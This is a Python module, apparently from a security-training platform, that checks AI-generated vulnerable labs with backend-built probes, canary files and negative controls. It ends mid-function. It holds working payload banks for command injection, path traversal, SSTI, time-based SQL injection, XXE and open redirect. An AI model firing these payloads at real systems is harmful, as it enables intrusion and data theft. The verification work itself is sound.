"""Backend-only verification probes for AI-synthesized labs (PR9-L).

Why this module exists
----------------------
Pre-PR9-L the synthesizer's "verification" was: send the LLM's payload to
the LLM's injection point, check the LLM's success_indicator in the
response. That's a closed loop — a lab consisting of a single ``GET /echo
?msg=<X>`` endpoint that returns ``<X>`` will pass trivially, because the
LLM picks the payload and the indicator together.

PR 9-K's user feedback loop (👍/👎 → degradation) catches some of those
echo machines after a human notices, but feedback is downstream, lagging,
and doesn't scale. The bar is: an LLM-faked lab must fail at synthesis
time, before any user sees it.

This module supplies probes built **entirely by the backend** — payloads,
canary tokens, expected substrings, and negative controls are all
constructed here, not by the LLM. Even probes the LLM might suggest are
ignored. The LLM only chooses the lab's source code and declares a
``response_kind`` (RCE / SSTI / path-traversal / etc.); the backend then
picks a matching probe class from the library below and exercises the
injection point with payloads it constructed itself.

Each probe also runs its own negative control (benign random payload of
similar shape) — so even if the lab passes a positive probe by accident,
it must also *not* pass when fed a benign analogue. An echo machine fails
the negative control by definition.

Adding a new probe class
------------------------
Subclass ``BackendProbe``, implement ``applies(response_kind)`` and
``async run(handle, ip)``. The verdict aggregator in
``synthesizer.py:_verify`` will pick it up via ``select_probes()``.
"""
from __future__ import annotations

import asyncio
import base64
import os
import pickle
import secrets
import shlex
import string
import time
import uuid
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from typing import Iterable

import docker
from docker.errors import APIError, NotFound

from app.core.config import get_settings
from app.core.logging import get_logger
from app.services.sandbox.catalog import InjectionPoint
from app.services.sandbox.manager import (
    LaunchedLab,
    SandboxError,
    exec_in_lab,
    proxy_request,
)

log = get_logger(__name__)


# ---------------------------------------------------------------------------
# Outcome types
# ---------------------------------------------------------------------------


@dataclass
class ProbeOutcome:
    """Result of one probe run against the spawned lab.

    ``evidence`` is a free-form dict the synthesizer writes verbatim into
    the mapping notes / spec so PR 9-K's prior_attempts_block can feed
    concrete failure context back into the next LLM prompt.
    """

    name: str
    kind: str  # the response_kind family this probe addresses
    passed: bool
    rationale: str
    evidence: dict = field(default_factory=dict)


@dataclass
class VerificationVerdict:
    """Aggregate verdict from all applicable probes plus the legacy check.

    ``method`` distinguishes how the lab was certified:
      * ``backend_probe`` — at least one backend probe positive AND its
        negative control negative. Strongest signal.
      * ``llm_indicator_only`` — no backend probe applied (unrecognised
        ``response_kind``); we fell back to the legacy LLM-payload check.
        Mapping is still cached but tagged as weakly-verified.
      * ``rejected`` — verification failed.
    """

    passed: bool
    method: str  # "backend_probe" | "llm_indicator_only" | "rejected"
    rejection_reason: str | None = None
    probe_results: list[ProbeOutcome] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


_NEG_ALPHABET = string.ascii_lowercase + string.digits


def _token(prefix: str = "k") -> str:
    """Short random token for canary stamping.

    Long enough that a fake response producing it by accident is
    statistically negligible; short enough that traversal payloads stay
    well under typical query-string limits.
    """
    return f"{prefix}_{secrets.token_hex(6)}"


def _benign_nonce(approx_len: int = 16) -> str:
    """Random alphanumeric of roughly the requested length, no metachars.

    Used as the negative-control payload — should pass through any normal
    handler without triggering anything special.
    """
    n = max(8, min(approx_len, 32))
    return "".join(secrets.choice(_NEG_ALPHABET) for _ in range(n))


async def _send(handle: LaunchedLab, ip: InjectionPoint, payload: str) -> dict:
    """Convert the injection-point shape to an HTTP request and fire it.

    Mirrors the existing ``synthesizer._verify`` dispatch table — keep
    them in lockstep, since both paths target the same labs.
    """
    params = data = json_body = headers = None
    loc = (ip.location or "query").lower()
    if loc == "form":
        data = {ip.parameter: payload}
    elif loc == "json":
        json_body = {ip.parameter: payload}
    elif loc == "header":
        headers = {ip.parameter: payload}
    elif loc == "path":
        params = {ip.parameter: payload}
    else:  # query
        params = {ip.parameter: payload}
    return await proxy_request(
        handle.target_url,
        ip.method,
        ip.path,
        params=params,
        data=data,
        json=json_body,
        headers=headers,
    )


def _normalize_kind(rk: str) -> str:
    return (rk or "").strip().lower().replace("_", "-")


def _truncate(s: str, n: int = 240) -> str:
    s = s or ""
    return s if len(s) <= n else s[:n] + "...(truncated)"


# ---------------------------------------------------------------------------
# Base class
# ---------------------------------------------------------------------------


class BackendProbe:
    """One probe class — backend-built, lab-agnostic.

    Subclasses set ``applies_to`` (response_kind aliases) and implement
    ``run``. The verdict aggregator runs ``run`` once per applicable
    probe and combines outcomes.
    """

    name: str = "base"
    applies_to: tuple[str, ...] = ()
    requires_exec: bool = False  # True if we need docker exec for canary

    def applies(self, response_kind: str) -> bool:
        rk = _normalize_kind(response_kind)
        return any(rk == _normalize_kind(a) or rk.startswith(_normalize_kind(a)) for a in self.applies_to)

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:  # noqa: D401
        raise NotImplementedError


# ---------------------------------------------------------------------------
# 1. RCE / command-exec probe — plant canary file via exec, force lab to read it
# ---------------------------------------------------------------------------


class RceCanaryProbe(BackendProbe):
    """Stamp a canary file the LLM cannot have pre-baked, then ask the lab
    to cat it through the injection point. Tries a small bank of common
    shell-metachar shapes so we don't depend on the LLM's payload wrapping
    style. Negative control = benign nonce — must NOT echo the canary."""

    name = "rce_canary_read"
    applies_to = ("rce", "command-exec", "command_exec", "cmd-exec", "code-exec", "shell")
    requires_exec = True

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        token = _token("rce")
        canary_path = f"/tmp/kestrel_canary_{token}"
        canary_value = f"KESTREL_RCE_OK_{token}"
        try:
            code, out = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name,
                kind="rce",
                passed=False,
                rationale=f"카나리 파일 stamp 실패 ({e}) — 컨테이너에 sh 가 없거나 /tmp 가 read-only일 수 있음.",
                evidence={"canary_path": canary_path, "stamp_error": str(e)},
            )
        if code != 0:
            return ProbeOutcome(
                name=self.name,
                kind="rce",
                passed=False,
                rationale=f"카나리 stamp 명령 종료코드 {code} — RCE 평가를 신뢰할 수 없음.",
                evidence={"canary_path": canary_path, "stamp_exit_code": code, "stamp_output": out[:200].decode(errors="replace")},
            )

        # Probe payloads: every common shell-injection wrapper. We don't
        # trust the LLM's payload format, so we try them all.
        cat = f"cat {canary_path}"
        positive_payloads = [
            f"; {cat}",
            f"|{cat}",
            f"&& {cat}",
            f"`{cat}`",
            f"$({cat})",
            f"\n{cat}\n",
            cat,  # in case the param is passed straight to popen() with shell=True
        ]
        positive_attempts: list[dict] = []
        positive_hit: dict | None = None
        for p in positive_payloads:
            try:
                ex = await _send(handle, ip, p)
            except SandboxError as e:
                positive_attempts.append({"payload": p, "error": str(e)})
                continue
            body = ex.get("body") or ""
            attempt = {
                "payload": p,
                "status": ex.get("status_code"),
                "body_head": _truncate(body, 160),
            }
            positive_attempts.append(attempt)
            if canary_value in body:
                positive_hit = attempt
                break

        if positive_hit is None:
            return ProbeOutcome(
                name=self.name,
                kind="rce",
                passed=False,
                rationale=(
                    f"backend 가 시도한 RCE 페이로드 {len(positive_payloads)}종 모두에서 카나리 값 "
                    f"'{canary_value}' 가 응답 본문에 등장하지 않음 — 실제 명령 실행 증거 없음."
                ),
                evidence={
                    "canary_path": canary_path,
                    "canary_value": canary_value,
                    "positive_attempts": positive_attempts,
                },
            )

        # Negative control — same canary, benign payload that does NOT
        # contain a command. If the lab still echoes the canary value,
        # it's pre-baked into the response somehow (or the lab leaks file
        # contents via path traversal masquerading as RCE — which is also
        # a misclassification we should reject).
        neg = _benign_nonce(len(positive_hit["payload"]))
        try:
            neg_ex = await _send(handle, ip, neg)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name,
                kind="rce",
                passed=False,
                rationale=f"음성 대조 요청이 실패함 ({e}) — RCE 신호 신뢰 불가.",
                evidence={"positive_hit": positive_hit, "negative_error": str(e)},
            )
        neg_body = neg_ex.get("body") or ""
        if canary_value in neg_body:
            return ProbeOutcome(
                name=self.name,
                kind="rce",
                passed=False,
                rationale=(
                    "양성 페이로드에서 카나리가 보였지만 benign nonce 에서도 카나리가 보임 — "
                    "응답이 페이로드와 무관하게 카나리를 노출하는 echo/leak 형태."
                ),
                evidence={
                    "positive_hit": positive_hit,
                    "negative_payload": neg,
                    "negative_body_head": _truncate(neg_body, 160),
                },
            )

        return ProbeOutcome(
            name=self.name,
            kind="rce",
            passed=True,
            rationale=(
                f"backend 가 stamp 한 카나리 '{canary_value}' 가 양성 페이로드 응답에 포함되었고 "
                f"benign nonce 응답에는 없음 — 명령 실행이 실제로 일어남."
            ),
            evidence={
                "canary_path": canary_path,
                "canary_value": canary_value,
                "positive_hit": positive_hit,
                "negative_payload": neg,
            },
        )


# ---------------------------------------------------------------------------
# 2. Path traversal probe — same canary file, force read via traversal path
# ---------------------------------------------------------------------------


class PathTraversalCanaryProbe(BackendProbe):
    """Plant canary at known absolute path, fire common traversal shapes.

    Distinguishes "real path traversal" (lab opens an arbitrary path on
    disk) from "fake reflect" (lab just echoes the parameter)."""

    name = "path_traversal_canary"
    applies_to = ("path-traversal", "path_traversal", "lfi", "file-read", "file_read", "directory-traversal")
    requires_exec = True

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        token = _token("trav")
        canary_path = f"/tmp/kestrel_canary_{token}"
        canary_value = f"KESTREL_TRAVERSAL_OK_{token}"
        try:
            code, _ = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name,
                kind="path-traversal",
                passed=False,
                rationale=f"카나리 파일 stamp 실패 ({e}).",
                evidence={"canary_path": canary_path, "stamp_error": str(e)},
            )
        if code != 0:
            return ProbeOutcome(
                name=self.name,
                kind="path-traversal",
                passed=False,
                rationale=f"카나리 stamp 종료코드 {code}.",
                evidence={"canary_path": canary_path, "stamp_exit_code": code},
            )

        # Common traversal shapes — different depths, encoded variants,
        # and absolute-path attempts.
        traversal_payloads = [
            canary_path,  # absolute (some apps allow it)
            "../" * 8 + canary_path.lstrip("/"),
            "..%2f" * 8 + canary_path.lstrip("/").replace("/", "%2f"),
            "....//" * 8 + canary_path.lstrip("/"),
            "/" + canary_path.lstrip("/"),
            f"file://{canary_path}",
        ]
        attempts: list[dict] = []
        positive_hit: dict | None = None
        for p in traversal_payloads:
            try:
                ex = await _send(handle, ip, p)
            except SandboxError as e:
                attempts.append({"payload": p, "error": str(e)})
                continue
            body = ex.get("body") or ""
            entry = {"payload": p, "status": ex.get("status_code"), "body_head": _truncate(body, 160)}
            attempts.append(entry)
            if canary_value in body:
                positive_hit = entry
                break

        if positive_hit is None:
            return ProbeOutcome(
                name=self.name,
                kind="path-traversal",
                passed=False,
                rationale=(
                    f"{len(traversal_payloads)} 종 traversal 페이로드 어느 것도 카나리 '{canary_value}' "
                    "을 응답에 노출시키지 못함 — 실제 임의 파일 읽기 증거 없음."
                ),
                evidence={"canary_path": canary_path, "canary_value": canary_value, "attempts": attempts},
            )

        # Negative control: send a path that doesn't exist; canary value
        # must not appear (this would mean the lab returns canary content
        # regardless of the requested path).
        neg = f"/tmp/kestrel_does_not_exist_{_token('neg')}"
        try:
            neg_ex = await _send(handle, ip, neg)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name,
                kind="path-traversal",
                passed=False,
                rationale=f"음성 대조 실패 ({e}).",
                evidence={"positive_hit": positive_hit, "negative_error": str(e)},
            )
        neg_body = neg_ex.get("body") or ""
        if canary_value in neg_body:
            return ProbeOutcome(
                name=self.name,
                kind="path-traversal",
                passed=False,
                rationale="양성/음성 모두 카나리가 노출됨 — path 와 무관하게 카나리를 흘리는 lab.",
                evidence={"positive_hit": positive_hit, "negative_payload": neg, "negative_body_head": _truncate(neg_body, 160)},
            )

        return ProbeOutcome(
            name=self.name,
            kind="path-traversal",
            passed=True,
            rationale=f"카나리 '{canary_value}' 가 traversal 페이로드 응답에만 노출됨 — 실제 임의 파일 읽기 동작 확인.",
            evidence={"canary_path": canary_path, "canary_value": canary_value, "positive_hit": positive_hit, "negative_payload": neg},
        )


# ---------------------------------------------------------------------------
# 3. SSTI probe — arithmetic expressions per common engine
# ---------------------------------------------------------------------------


_SSTI_ENGINES: list[tuple[str, str, str]] = [
    # (engine_label, template_payload, expected_substring_in_response)
    # We pick numbers whose product is unlikely to appear by accident in
    # error messages or random page chrome — 7*191=1337 is a memorable
    # choice; 47*53=2491 is the secondary.
    ("jinja2/twig", "{{7*191}}", "1337"),
    ("jinja2/twig-alt", "{{47*53}}", "2491"),
    ("jinja2-string", "{{'kx'*5}}", "kxkxkxkxkx"),
    ("freemarker/spring", "${7*191}", "1337"),
    ("erb/jsp", "<%= 7*191 %>", "1337"),
    ("smarty", "{7*191}", "1337"),
    ("velocity", "#set($x=7*191)$x", "1337"),
    ("razor", "@(7*191)", "1337"),
]


class SstiArithmeticProbe(BackendProbe):
    """Try a small bank of engine-specific arithmetic templates. A real
    SSTI lab evaluates one of them and produces the product in the
    response; a pure reflect lab echoes the expression literally."""

    name = "ssti_arithmetic"
    applies_to = ("ssti", "template-injection", "template_injection")

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        attempts: list[dict] = []
        positive_hit: dict | None = None
        for label, payload, expected in _SSTI_ENGINES:
            try:
                ex = await _send(handle, ip, payload)
            except SandboxError as e:
                attempts.append({"engine": label, "payload": payload, "error": str(e)})
                continue
            body = ex.get("body") or ""
            entry = {
                "engine": label,
                "payload": payload,
                "status": ex.get("status_code"),
                "body_head": _truncate(body, 160),
                "expected": expected,
            }
            attempts.append(entry)
            # Real SSTI: expected substring present AND raw expression NOT
            # present (otherwise it's just reflect, which we reject).
            if expected in body and payload not in body:
                positive_hit = entry
                break

        if positive_hit is None:
            # Did any engine at least echo the literal expression?
            reflected = next((a for a in attempts if a.get("payload") and a["payload"] in (a.get("body_head") or "")), None)
            return ProbeOutcome(
                name=self.name,
                kind="ssti",
                passed=False,
                rationale=(
                    "어떤 엔진의 산술식도 평가되지 않음 — "
                    + ("리터럴이 그대로 reflect 되었으므로 SSTI 가 아니라 단순 reflect." if reflected else "응답에 평가 결과가 없음.")
                ),
                evidence={"attempts": attempts, "reflected_only": reflected},
            )

        # Negative control: send a benign string of similar shape; the
        # 1337/2491 substring must not appear (would imply hardcoded).
        neg = _benign_nonce(len(positive_hit["payload"]))
        try:
            neg_ex = await _send(handle, ip, neg)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name,
                kind="ssti",
                passed=False,
                rationale=f"음성 대조 실패 ({e}).",
                evidence={"positive_hit": positive_hit, "negative_error": str(e)},
            )
        neg_body = neg_ex.get("body") or ""
        if positive_hit["expected"] in neg_body:
            return ProbeOutcome(
                name=self.name,
                kind="ssti",
                passed=False,
                rationale="benign nonce 응답에도 동일한 평가 결과가 등장 — 평가가 아니라 하드코딩된 응답.",
                evidence={"positive_hit": positive_hit, "negative_payload": neg, "negative_body_head": _truncate(neg_body, 160)},
            )

        return ProbeOutcome(
            name=self.name,
            kind="ssti",
            passed=True,
            rationale=f"엔진 '{positive_hit['engine']}' 의 산술식이 실제로 평가됨 (예상 결과 '{positive_hit['expected']}' 응답에 포함).",
            evidence={"positive_hit": positive_hit, "negative_payload": neg, "all_attempts": attempts},
        )


# ---------------------------------------------------------------------------
# 4. XSS / HTML-reflect probe — unique nonce, must reflect exactly
# ---------------------------------------------------------------------------


class XssReflectProbe(BackendProbe):
    """Sanity-check pure-reflect labs.

    Reflect labs *should* echo arbitrary input. We give a backend-chosen
    unique nonce, expect it back; then a different nonce, expect the new
    one back AND the old one absent. This rules out hardcoded responses
    that always include the LLM's chosen indicator."""

    name = "xss_reflect_nonce"
    applies_to = ("xss", "html-reflect", "html_reflect", "reflect", "json-reflect", "json_reflect", "stored-xss")

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        nonce_a = f"KXSS_{secrets.token_hex(8)}"
        nonce_b = f"KXSS_{secrets.token_hex(8)}"
        try:
            ex_a = await _send(handle, ip, nonce_a)
            ex_b = await _send(handle, ip, nonce_b)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name,
                kind="reflect",
                passed=False,
                rationale=f"reflect 검증 요청 실패 ({e}).",
                evidence={"error": str(e)},
            )
        body_a = ex_a.get("body") or ""
        body_b = ex_b.get("body") or ""
        if nonce_a not in body_a:
            return ProbeOutcome(
                name=self.name,
                kind="reflect",
                passed=False,
                rationale=f"backend nonce '{nonce_a}' 가 응답에 reflect 되지 않음 — reflect lab 이 아님.",
                evidence={"nonce_a": nonce_a, "body_a_head": _truncate(body_a, 160)},
            )
        if nonce_b not in body_b:
            return ProbeOutcome(
                name=self.name,
                kind="reflect",
                passed=False,
                rationale=f"두 번째 nonce '{nonce_b}' 가 reflect 안 됨 — 응답이 입력과 무관함.",
                evidence={"nonce_b": nonce_b, "body_b_head": _truncate(body_b, 160)},
            )
        if nonce_a in body_b:
            return ProbeOutcome(
                name=self.name,
                kind="reflect",
                passed=False,
                rationale=f"두 번째 응답에 첫 번째 nonce 가 그대로 포함 — 응답에 입력과 무관한 하드코딩 영역이 있음.",
                evidence={"nonce_a": nonce_a, "nonce_b": nonce_b, "body_b_head": _truncate(body_b, 160)},
            )
        return ProbeOutcome(
            name=self.name,
            kind="reflect",
            passed=True,
            rationale="두 개의 backend-chosen nonce 가 각각 자신의 응답에만 reflect 됨 — 정상 reflect 동작 확인.",
            evidence={"nonce_a": nonce_a, "nonce_b": nonce_b},
        )


# ---------------------------------------------------------------------------
# 5. SQLi time-based blind probe — measures latency under sleep payloads
# ---------------------------------------------------------------------------


class SqliTimeBlindProbe(BackendProbe):
    """Time-based blind SQLi: send sleep payloads (PG/MySQL/SQLite/MSSQL)
    and compare response latency against a benign baseline. A real SQLi
    lab will block for ~``sleep_seconds`` on at least one variant."""

    name = "sqli_time_blind"
    applies_to = ("sqli", "sql-injection", "sql_injection", "blind-sqli", "boolean-sqli")

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        sleep_seconds = 2.0
        # Baseline — average of three benign requests so brief network
        # noise doesn't pollute the comparison.
        baselines: list[float] = []
        for _ in range(3):
            t0 = time.monotonic()
            try:
                await _send(handle, ip, _benign_nonce(12))
            except SandboxError as e:
                return ProbeOutcome(
                    name=self.name,
                    kind="sqli",
                    passed=False,
                    rationale=f"baseline 요청 실패 ({e}).",
                    evidence={"error": str(e)},
                )
            baselines.append(time.monotonic() - t0)
        baseline = sum(baselines) / len(baselines)

        sleep_payloads = [
            f"' OR pg_sleep({sleep_seconds})--",
            f"1' OR SLEEP({sleep_seconds})-- -",
            f"'); SELECT pg_sleep({sleep_seconds});--",
            f"1 AND SLEEP({sleep_seconds})",
            f"'; WAITFOR DELAY '0:0:{int(sleep_seconds)}'--",
            f"1' AND randomblob({int(sleep_seconds * 100000000)})--",  # SQLite CPU-burn, approximates sleep
        ]
        attempts: list[dict] = []
        positive_hit: dict | None = None
        for p in sleep_payloads:
            t0 = time.monotonic()
            try:
                ex = await _send(handle, ip, p)
            except SandboxError as e:
                attempts.append({"payload": p, "error": str(e)})
                continue
            elapsed = time.monotonic() - t0
            entry = {
                "payload": p,
                "status": ex.get("status_code"),
                "elapsed_seconds": round(elapsed, 3),
                "baseline_seconds": round(baseline, 3),
            }
            attempts.append(entry)
            # Trigger if the response took at least baseline + (sleep * 0.7).
            if elapsed >= baseline + sleep_seconds * 0.7:
                positive_hit = entry
                break

        if positive_hit is None:
            return ProbeOutcome(
                name=self.name,
                kind="sqli",
                passed=False,
                rationale=(
                    f"sleep 페이로드 {len(sleep_payloads)} 종 모두 baseline ({round(baseline, 3)}s) 대비 "
                    f"의미 있는 지연 없음 — time-based blind SQLi 증거 없음."
                ),
                evidence={"baseline_seconds": round(baseline, 3), "attempts": attempts},
            )

        # Re-baseline after the positive hit to rule out transient slowdown.
        post_baseline_t = time.monotonic()
        try:
            await _send(handle, ip, _benign_nonce(12))
        except SandboxError:
            return ProbeOutcome(
                name=self.name,
                kind="sqli",
                passed=False,
                rationale="positive 직후 baseline 측정 실패.",
                evidence={"positive_hit": positive_hit},
            )
        post_baseline = time.monotonic() - post_baseline_t
        if post_baseline >= baseline + sleep_seconds * 0.5:
            return ProbeOutcome(
                name=self.name,
                kind="sqli",
                passed=False,
                rationale=(
                    f"positive 직후 baseline 도 동일하게 느림 ({round(post_baseline, 3)}s) — "
                    "lab 이 일시적으로 전체적으로 느려진 것일 수 있어 SQLi 신호 신뢰 불가."
                ),
                evidence={"positive_hit": positive_hit, "post_baseline_seconds": round(post_baseline, 3)},
            )

        return ProbeOutcome(
            name=self.name,
            kind="sqli",
            passed=True,
            rationale=(
                f"sleep 페이로드 응답이 baseline 보다 {round(positive_hit['elapsed_seconds'] - baseline, 2)}s 더 걸림 "
                f"(>= {round(sleep_seconds * 0.7, 2)}s 기준 통과) — time-based blind SQLi 동작 확인."
            ),
            evidence={"positive_hit": positive_hit, "baseline_seconds": round(baseline, 3), "post_baseline_seconds": round(post_baseline, 3)},
        )


# ---------------------------------------------------------------------------
# 6. XXE probe — XML payload pulls in a backend-stamped canary via file://
# ---------------------------------------------------------------------------


class XxeCanaryProbe(BackendProbe):
    """XML External Entity. We stamp a canary file (same exec channel as
    RCE) and send XML that declares an external entity pointing at it.
    A real XXE-vulnerable parser inlines the file contents into the
    document; the rendered response then leaks the canary back to us.

    Negative control = benign XML with no entity declarations — must not
    surface the canary."""

    name = "xxe_canary_read"
    applies_to = ("xxe", "xml-external-entity", "xml_external_entity", "xml-injection")
    requires_exec = True

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        token = _token("xxe")
        canary_path = f"/tmp/kestrel_canary_{token}"
        canary_value = f"KESTREL_XXE_OK_{token}"
        try:
            code, _ = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name, kind="xxe", passed=False,
                rationale=f"카나리 stamp 실패 ({e}).",
                evidence={"canary_path": canary_path, "stamp_error": str(e)},
            )
        if code != 0:
            return ProbeOutcome(
                name=self.name, kind="xxe", passed=False,
                rationale=f"카나리 stamp 종료코드 {code}.",
                evidence={"canary_path": canary_path, "stamp_exit_code": code},
            )

        # XML payload bank — three common XXE shapes (general entity,
        # parameter entity, no-prologue). DOCTYPE-with-ENTITY is the
        # essence; some parsers reject one form but accept another.
        xxe_payloads = [
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{canary_path}">]><r>&x;</r>',
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file://{canary_path}"> %a;]><r>test</r>',
            f'<!DOCTYPE r [<!ENTITY x SYSTEM "file://{canary_path}">]><r>&x;</r>',
        ]
        attempts: list[dict] = []
        positive_hit: dict | None = None
        for p in xxe_payloads:
            try:
                ex = await _send(handle, ip, p)
            except SandboxError as e:
                attempts.append({"payload_head": p[:80], "error": str(e)})
                continue
            body = ex.get("body") or ""
            entry = {"payload_head": p[:80], "status": ex.get("status_code"), "body_head": _truncate(body, 160)}
            attempts.append(entry)
            if canary_value in body:
                positive_hit = entry
                break

        if positive_hit is None:
            return ProbeOutcome(
                name=self.name, kind="xxe", passed=False,
                rationale=(
                    f"backend 가 보낸 XXE 페이로드 {len(xxe_payloads)} 종 모두에서 카나리 '{canary_value}' "
                    "가 응답에 등장하지 않음 — XXE 파싱 증거 없음."
                ),
                evidence={"canary_path": canary_path, "canary_value": canary_value, "attempts": attempts},
            )

        # Negative control: well-formed XML with no entity declarations.
        neg = f'<?xml version="1.0"?><r>{_benign_nonce(16)}</r>'
        try:
            neg_ex = await _send(handle, ip, neg)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name, kind="xxe", passed=False,
                rationale=f"음성 대조 실패 ({e}).",
                evidence={"positive_hit": positive_hit, "negative_error": str(e)},
            )
        neg_body = neg_ex.get("body") or ""
        if canary_value in neg_body:
            return ProbeOutcome(
                name=self.name, kind="xxe", passed=False,
                rationale="entity 없는 benign XML 응답에도 카나리 등장 — 입력과 무관한 echo/leak.",
                evidence={"positive_hit": positive_hit, "negative_payload": neg, "negative_body_head": _truncate(neg_body, 160)},
            )

        return ProbeOutcome(
            name=self.name, kind="xxe", passed=True,
            rationale=f"외부 엔티티가 backend-stamped 카나리 '{canary_value}' 를 응답에 인라인함 — 실제 XXE 파싱 확인.",
            evidence={"canary_path": canary_path, "canary_value": canary_value, "positive_hit": positive_hit, "negative_payload": neg},
        )


# ---------------------------------------------------------------------------
# 7. Open redirect probe — backend nonce URL must reflect into Location
# ---------------------------------------------------------------------------


class OpenRedirectProbe(BackendProbe):
    """Open redirect. We send a unique URL the LLM cannot have pre-baked
    and check the response is a 3xx with our URL in the Location header.
    A truly hardcoded redirect (e.g., always to ``/``) fails the nonce
    match. A non-redirecting echo lab fails the status check."""

    name = "open_redirect_nonce"
    applies_to = ("open-redirect", "open_redirect", "redirect-to", "url-redirect", "openredirect")

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        nonce = secrets.token_hex(8)
        target = f"https://kestrel-redirect-{nonce}.example/"
        try:
            ex = await _send(handle, ip, target)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name, kind="open-redirect", passed=False,
                rationale=f"redirect 검증 요청 실패 ({e}).",
                evidence={"error": str(e)},
            )
        status = ex.get("status_code") or 0
        headers = {str(k).lower(): str(v) for k, v in (ex.get("response_headers") or {}).items()}
        location = headers.get("location") or ""
        if status not in (301, 302, 303, 307, 308):
            return ProbeOutcome(
                name=self.name, kind="open-redirect", passed=False,
                rationale=f"응답 status={status} 가 3xx 가 아님 — redirect 동작 자체가 없음.",
                evidence={"nonce": nonce, "status": status, "location": location, "body_head": _truncate(ex.get("body") or "", 160)},
            )
        if nonce not in location:
            return ProbeOutcome(
                name=self.name, kind="open-redirect", passed=False,
                rationale=(
                    f"3xx 는 떴지만 Location 에 backend nonce '{nonce}' 가 없음 — "
                    "사용자 입력과 무관한 하드코딩 redirect 추정."
                ),
                evidence={"nonce": nonce, "status": status, "location": location},
            )

        # Negative control: send a benign-looking relative path; nonce must
        # not appear in *its* Location (would mean lab caches across reqs
        # or echoes hardcoded value).
        neg = f"/safe/{_benign_nonce(8)}"
        try:
            neg_ex = await _send(handle, ip, neg)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name, kind="open-redirect", passed=False,
                rationale=f"음성 대조 실패 ({e}).",
                evidence={"positive": {"nonce": nonce, "location": location}, "negative_error": str(e)},
            )
        neg_headers = {str(k).lower(): str(v) for k, v in (neg_ex.get("response_headers") or {}).items()}
        neg_location = neg_headers.get("location") or ""
        if nonce in neg_location:
            return ProbeOutcome(
                name=self.name, kind="open-redirect", passed=False,
                rationale="음성 대조 요청의 Location 에 양성 nonce 가 그대로 등장 — 입력과 무관한 캐싱/하드코딩.",
                evidence={"positive": {"nonce": nonce, "location": location}, "negative_payload": neg, "negative_location": neg_location},
            )

        return ProbeOutcome(
            name=self.name, kind="open-redirect", passed=True,
            rationale=f"3xx 응답의 Location 에 backend nonce '{nonce}' 가 그대로 포함 — 실제 open redirect 확인.",
            evidence={"nonce": nonce, "status": status, "location": location, "negative_payload": neg, "negative_location": neg_location},
        )


# ---------------------------------------------------------------------------
# 8. SSRF probe — backend HTTP canary on the sandbox network
# ---------------------------------------------------------------------------


# Image used for the throwaway canary listener. Alpine python is small
# (~50 MB) and warm-pulls quickly; the container only runs the inline
# stdlib HTTP server so we don't need anything else on top.
_SSRF_CANARY_IMAGE = "python:3.12-alpine"

# Inline server: every GET writes the request path + a UTC timestamp to
# /tmp/hits.log, then returns a tiny "OK" body. Stdlib only — no pip
# install — so the container starts in seconds. We bind 0.0.0.0:80 so
# the lab can address us via the docker DNS name on the sandbox network.
_SSRF_CANARY_SCRIPT = (
    "import http.server,datetime,sys\n"
    "class H(http.server.BaseHTTPRequestHandler):\n"
    " def do_GET(s):\n"
    "  open('/tmp/hits.log','a').write(datetime.datetime.utcnow().isoformat()+' '+s.path+'\\n')\n"
    "  s.send_response(200);s.end_headers();s.wfile.write(b'OK')\n"
    " def log_message(s,*a,**k):pass\n"
    "http.server.HTTPServer(('0.0.0.0',80),H).serve_forever()\n"
)


@asynccontextmanager
async def _ssrf_canary():
    """Spin a one-shot HTTP canary on the sandbox network and tear it down.

    The canary records every inbound GET to ``/tmp/hits.log`` so the probe
    can read hits via ``exec_in_lab``. We use docker DNS — the lab can
    reach the canary by its container name on ``settings.sandbox_network``
    without any host-side port mapping (so the canary stays unreachable
    from the host the way the labs themselves are).
    """
    settings = get_settings()
    name = f"kestrel-ssrf-canary-{secrets.token_hex(4)}"

    def _spawn() -> None:
        cli = docker.from_env()
        cli.containers.run(
            image=_SSRF_CANARY_IMAGE,
            name=name,
            detach=True,
            remove=False,
            network=settings.sandbox_network,
            command=["python", "-c", _SSRF_CANARY_SCRIPT],
            mem_limit="64m",
            memswap_limit="64m",
            nano_cpus=int(0.25 * 1_000_000_000),
            pids_limit=64,
            cap_drop=["ALL"],
            security_opt=["no-new-privileges:true"],
            tmpfs={"/tmp": "rw,size=4m"},
            labels={"kestrel.sandbox.kind": "ssrf-canary"},
        )

    def _kill() -> None:
        cli = docker.from_env()
        try:
            c = cli.containers.get(name)
        except NotFound:
            return
        try:
            c.kill()
        except APIError:
            pass
        try:
            c.remove(force=True)
        except APIError:
            pass

    try:
